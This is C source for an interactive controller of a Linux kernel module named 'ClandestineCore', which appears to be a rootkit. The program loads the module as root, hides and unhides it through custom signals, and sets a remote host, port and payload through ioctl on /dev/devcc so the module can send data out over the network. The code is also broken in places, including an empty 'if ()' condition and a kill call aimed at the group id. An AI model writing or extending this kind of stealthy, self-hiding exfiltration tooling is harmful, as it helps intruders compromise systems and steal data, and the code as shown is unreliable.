#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/syscall.h> //https://github.com/torvalds/linux/blob/master/include/linux/syscalls.h
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <sys/ioctl.h>

#define MODPATH "../kmodule/ClandestineCore.ko"
#define SIGALWRECV 51
#define SIGREMRECV 52
#define SIGHIDEMOD 53
#define SIGUNHIDEM 54
#define SIGSENDNET 55

#define IOCTL_IP    0x100
#define IOCTL_PORT  0x200
#define IOCTL_DATA  0x300

#define IOCTL_BUFF_SIZE 1024

struct ioctl_data {
    size_t size;
    char buffer[IOCTL_BUFF_SIZE];
};

typedef struct ctx {
    int module_loaded;
    int module_hidded;
    int device_created;
    int rHost_set;
    int rPort_set;
    int payload_set;
    int data_ready;
} ctx;

static ctx context = {
    .module_loaded = 0,
    .module_hidded = 0,
    .device_created = 0,
    .rHost_set = 0,
    .rPort_set = 0,
    .payload_set = 0,
};

void install_Core(void) {
    if (geteuid() != 0) {
        printf("[Error] This option need root privileges !\n");
        return;
    }
    if (context.module_loaded) {
        printf("ClandestineCore déjà chargé !\n");
        return;
    }
    struct stat st;
    int fd = open(MODPATH, O_RDONLY);
    if (fd == -1) {
        perror("[Erreur] install_Core() | open");
        return;
    }
    if (fstat(fd, &st) == -1) {
        perror("[Erreur] install_Core() | fstat");
        close(fd);
        return;
    }

    void *module_image = malloc(st.st_size);
    if (!module_image) {
        perror("[Erreur] install_Core() | malloc");
        close(fd);
        return;
    }

    ssize_t bytes = read(fd, module_image, st.st_size);
    if (bytes != st.st_size) {
        perror("[Erreur] install_Core() | read");
        free(module_image);
        close(fd);
        return;
    }
    close(fd);

    int ret = syscall(SYS_init_module, module_image, st.st_size, "");
    if (ret == 0) {
        printf("ClandestineCore loaded !\n");
        context.module_loaded = 1;
    } else {
        perror("[Erreur] install_Core() | syscall");
    }

    free(module_image);
}

void do_sig(int sig) {
    //asmlinkage long sys_kill(pid_t pid, int sig);
    syscall(SYS_kill, getgid(), sig);
}

void set_rHost(void) {
    int fd = open("/dev/devcc", O_RDWR);
    if (fd < 0) {
        perror("[Erreur] set_rHost() | open /dev/devcc");
        return;
    }
    struct ioctl_data data;
    printf("Entrez l'IP: ");
    if (!fgets(data.buffer, IOCTL_BUFF_SIZE, stdin)) {
        perror("[Erreur] set_rHost() | fgets");
        close(fd);
        return;
    }
    data.size = strlen(data.buffer);
    if (data.size > 0 && data.buffer[data.size - 1] == '\n') {
        data.buffer[data.size - 1] = '\0';
        data.size--;
    }
    if (ioctl(fd, IOCTL_IP, &data) < 0) {
        perror("[Erreur] set_rHost() | ioctl(IOCTL_IP)");
    } else {
        printf("RHOST set !\n");
        if (context.rHost_set + context.rPort_set + context.payload_set == 3){
            context.data_ready = 1;
        }
        context.rHost_set = 1;
    }
    close(fd);
}

void set_rPort(void) {
    int fd = open("/dev/devcc", O_RDWR);
    if (fd < 0) {
        perror("[Erreur] set_rPort() | open /dev/devcc");
        return;
    }
    int port;
    char buf[16];
    printf("Entrez le port: ");
    if (!fgets(buf, sizeof(buf), stdin)) {
        perror("[Erreur] set_rPort() | fgets");
        close(fd);
        return;
    }
    port = atoi(buf);
    if (ioctl(fd, IOCTL_PORT, &port) < 0) {
        perror("[Erreur] set_rPort() | ioctl(IOCTL_PORT)");
    } else {
        printf("RPORT set !\n");
        if (context.rHost_set + context.rPort_set + context.payload_set == 3){
            context.data_ready = 1;
        }
        context.rPort_set = 1;
    }
    close(fd);
}

void set_Payload(void) {
    int fd = open("/dev/devcc", O_RDWR);
    if (fd < 0) {
        perror("[Erreur] set_Payload | open /dev/devcc");
        return;
    }
    struct ioctl_data data;
    printf("Entrez le payload: ");
    if (!fgets(data.buffer, IOCTL_BUFF_SIZE, stdin)) {
        perror("[Erreur] set_Payload | fgets");
        close(fd);
        return;
    }
    data.size = strlen(data.buffer);
    if (data.size > 0 && data.buffer[data.size - 1] == '\n') {
        data.buffer[data.size - 1] = '\0';
        data.size--;
    }
    if (ioctl(fd, IOCTL_DATA, &data) < 0) {
        perror("[Erreur] set_Payload | ioctl(IOCTL_DATA)");
    } else {
        printf("Payload set !\n");
        context.payload_set = 1;
        if (context.rHost_set + context.rPort_set + context.payload_set == 3){
            context.data_ready = 1;
        }
    }
    close(fd);
}

void signal_handler(int signum) {
}

void setup_signal_handlers(void) {
    struct sigaction sa;
    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    for (int sig = SIGALWRECV; sig <= SIGSENDNET; sig++) {
        if (sigaction(sig, &sa, NULL) < 0) {
            perror("sigaction");
        }
    }
}

void show_menu(void) {
    printf( "\n=== Menu ===\n" );
    printf( !context.module_loaded  ? " 0. Install ClandestineCore\n"    : " -  (ClandestineCore loaded)\n" );
    if (context.module_loaded) {
        printf( !context.device_created ? " 1. Create Device (/dev/devcc)\n" : " -  (Device Created)\n" );
        if (context.device_created) {
            printf( !context.rHost_set   ? "\t11. Set RHOST\n"  : "\t - (RHOST set)\n");
            printf( !context.rPort_set   ? "\t12. Set RPORT\n"  : "\t - (RPORT set)\n");
            printf( !context.payload_set ? "\t13. Set Payload\n": "\t - (Payload set)\n");
        }
        printf(  context.device_created ? " 2. Close Device\n"               : " -  (Device not created)\n" );
        printf( !context.module_hidded  ? " 3. Hide Module\n"                : " -  (Module hidden)\n" );
        printf(  context.module_hidded  ? " 4. Unhide Module\n"              : " -  (Module not loaded)\n" );
        printf(  context.data_ready     ? " 5. Send Data\n"                  : " -  (Data not ready)\n" );
    } else {
        printf(" -  (load module first...)\n");
    }
    printf( " 6. Exit\n" );
    printf( "Choix : " );
}

int main(int argc, char** argv) {
    setup_signal_handlers();

    int choice;
    while (1) {
        show_menu();
        scanf("%d", &choice);
        int c;
        while ((c = getchar()) != '\n' && c != EOF);
            switch (choice) {
                case 0:
                    install_Core();
                    break;
                case 1:
                    if (!context.device_created){
                        do_sig(SIGALWRECV);
                        context.device_created = 1;
                    }
                    break;
                case 11 :
                    set_rHost();
                    break;
                case 12 :
                    set_rPort();
                    break;
                case 13 :
                    set_Payload();
                    break;
                case 2:
                    if (context.device_created) {
                        do_sig(SIGREMRECV);
                        context.device_created = 0;
                    }
                    break;
                case 3:
                    if (!context.module_hidded) {
                        do_sig(SIGHIDEMOD);
                        context.module_hidded = 1;
                    }
                    break;
                case 4:
                    if (context.module_hidded) {
                        do_sig(SIGUNHIDEM);
                        context.module_hidded = 0;
                    }
                    break;
                case 5:
                    if () {
                        do_sig(SIGSENDNET);
                        context.rHost_set   = 0;
                        context.rPort_set   = 0;
                        context.payload_set = 0;
                        context.data_ready  = 0;
                    }
                    break;
                case 6:
                    printf("Sortie...\n");
                    exit(EXIT_SUCCESS);
                default:
                    printf("Choix invalide\n");
        }
    }

    return 0;
}